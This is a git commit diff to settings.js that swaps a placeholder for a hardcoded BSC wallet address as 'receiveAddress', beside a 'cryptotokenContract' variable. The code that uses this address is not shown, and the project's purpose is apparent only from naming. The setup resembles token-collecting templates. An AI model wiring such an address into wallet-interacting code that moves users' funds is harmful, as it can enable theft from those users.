46a48f29867fb9d2fb9cb75cc82ded4379c9689c
thcfoeyogramma <104220925+thcfoeyogramma@users.noreply.github.com>
2022-08-13 16:42:55 -0400

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,4 +1,4 @@
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xEa47B4E14156daF5265C700ca3A98e56e22C2ef0";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
